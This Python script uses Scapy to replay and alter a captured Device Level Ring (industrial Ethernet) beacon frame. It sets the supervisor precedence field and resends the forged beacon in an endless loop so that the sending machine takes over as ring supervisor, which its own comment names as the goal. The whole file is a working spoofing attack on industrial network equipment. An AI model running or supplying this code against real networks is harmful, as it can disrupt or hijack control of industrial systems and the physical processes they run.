__author__ = 'bernardyuan'

from scapy import all
from scapy.layers import  l2
import DLR
# read the pcap file
a = all.rdpcap('DLR/dlr.pcap')
import time
#in order: Beacon, nbr request, link status, locate fault,Announce, Sign on
# fake a packet and send through wireshark

#fabricate packet method 1:
#construct from keywords
# b = l2.Ether(**a[i][l2.Ether].fields)/l2.Dot1Q(**a[i][l2.Dot1Q].fields)/protocol.DLR(**a[i][protocol.DLR].fields)
# remember when constructed from keywords, do change the explicit value of ALL layers into 1
# otherwise use method 2, given below:
# b.explicit = 1
# b.payload.explicit = 1

# method 2:
# construct from raw string
# b0 = l2.Ether(str(a[0]))

# In the following code, we construct a new packet with method2, which could make your machine imitate
# a ring supervisor, and take control of the ring
newpacket = l2.Ether(str(a[0]))
newpacket.payload.payload.fields["Supervisor_Precedence"] = 1
newpacket.payload.payload.fields["Reserved"]='\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19'
interval = newpacket.payload.payload.fields["Beacon_Interval"]
start = time.clock()
all.sendp(str(newpacket),iface='en4')

while True:
    if time.clock() - start > interval*1.0/1000:
        start = time.clock()
        all.sendp(str(newpacket),iface='en4')


